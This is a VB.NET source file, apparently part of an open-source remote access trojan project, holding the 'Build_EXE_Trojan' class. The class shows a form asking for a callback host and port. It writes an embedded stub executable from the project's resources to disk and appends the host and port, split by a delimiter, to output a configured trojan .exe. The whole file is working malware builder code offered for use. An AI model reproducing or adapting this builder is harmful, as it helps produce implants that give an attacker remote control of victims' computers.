Imports System.IO

Public Class Build_EXE_Trojan
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Private Build_Trojan_Form As New Form
    Public exe_host As String = ""
    Private WithEvents b1, b2 As New Button
    Private t1, t2 As New TextBox
    Private host As String : Private port As Integer
    Friend sh As Boolean = False
    Public Function return_ex() As String
        Return exe_host
    End Function
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Friend Sub showme()
        Build_Trojan_Form.FormBorderStyle = FormBorderStyle.None

        Build_Trojan_Form.StartPosition = FormStartPosition.CenterScreen
        Build_Trojan_Form.Size = New Size(450, 100)
        Build_Trojan_Form.BackColor = Color.Snow
        Build_Trojan_Form.TopMost = True
        Build_Trojan_Form.Font = New Font("Microsoft Sans Serif", 10, FontStyle.Bold)

        Dim label1 As New Label
        label1.Location = New Point(1, 1)
        label1.Text = "Build EXE Trojan"
        label1.Width = 150
        Build_Trojan_Form.Controls.Add(label1)




        label1 = New Label
        label1.Location = New Point(1, 25)
        label1.Text = "Host : "
        label1.Width = 150
        Build_Trojan_Form.Controls.Add(label1)

        label1 = New Label
        label1.Location = New Point(1, 50)
        label1.Text = "Port : "
        label1.Width = 150
        Build_Trojan_Form.Controls.Add(label1)



        b1.Location = New Point(Build_Trojan_Form.Width - 140, 78)
        b1.Text = "OK"
        b1.Width = 50
        Build_Trojan_Form.Controls.Add(b1)



        b2.Location = New Point(Build_Trojan_Form.Width - 75, 78)
        b2.Text = "Cancel"
        b2.Width = 70
        Build_Trojan_Form.Controls.Add(b2)

        t1.BackColor = Color.LightGray : t2.BackColor = Color.LightGray

        t1.Location = New Point(75, 25 - 3)
        t1.Text = "127.0.0.1"
        t1.Width = 200
        Build_Trojan_Form.Controls.Add(t1)
        t2.Location = New Point(75, 50 - 3)
        t2.Text = Form1.RET_PORT
        t2.Width = 200
        Build_Trojan_Form.Controls.Add(t2)

        t1.BringToFront()
        t2.BringToFront()

        Build_Trojan_Form.Show()
        sh = True
    End Sub
    Private Sub Build_Trojan()
        Dim stub, text1, text2 As String
        Const spl As String = "abccba" ' same in server if you wanna to change it  , we have to change it in server 

        Dim s As New SaveFileDialog
        s.ShowDialog()
        Try
            If s.FileName > "" Then

                text1 = host

                text2 = port
                exe_host = "exehost=" & text1 & "port=" & text2
                Dim temp As String = Application.StartupPath & "stub.exe" '"Windows Process Host.exe"



                File.WriteAllBytes(temp, My.Resources.Con_Process_CONF)

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default) ' will try to save it and while saving it will put the options you selected 
                FilePut(1, stub & spl & text1 & spl & text2)
                ' will send and write in server check state so we will handel or check boxes

                ' Make sure !!!!!!!!!!! every entry  is splitted by spl to avoid mixing 
                ' after putting will close 
                FileClose()
                MsgBox("Done !! " & Environment.NewLine & "File Saved in " & Environment.NewLine & s.FileName, MsgBoxStyle.Information)
                Try
                    IO.File.Delete(temp)
                Catch ex As Exception

                End Try
            Else


            End If

        Catch ex As Exception
            MsgBox("Build Error : " & ex.Message, MsgBoxStyle.Critical)
        End Try


    End Sub
    Private Sub b1_click() Handles b1.Click
        host = t1.Text
        port = t2.Text
        '   Dim x As New ErrorMsgBox("Build Error : " & vbNewLine & "asidnsaiodnasoidnmasdm")

        Build_Trojan()


        b2_click()
        Form1.Build_exe_BOOL = False
    End Sub
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
    Private Sub b2_click() Handles b2.Click
        Build_Trojan_Form.Close()
        sh = False
        Form1.Build_exe_BOOL = False
    End Sub
End Class
